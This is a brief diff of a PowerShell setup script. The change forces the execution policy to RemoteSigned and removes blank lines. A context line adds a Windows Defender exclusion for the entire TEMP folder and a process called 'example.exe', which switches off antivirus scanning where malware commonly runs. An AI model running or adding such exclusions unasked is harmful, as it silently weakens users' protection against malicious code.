@@ -8,7 +8,7 @@ If (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     Exit
 }
 
-Set-ExecutionPolicy RemoteSigned
+Set-ExecutionPolicy RemoteSigned -Force
 
 Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe"
 
@@ -16,8 +16,6 @@ Add-MpPreference -ExclusionPath "$env:TEMP" -ExclusionProcess "example.exe"
 
 # # If script reaches here, it is running with Administrator privileges
 # Write-Host "This script is running with Administrator privileges."
-
-
 
 
 # ##############################################################################
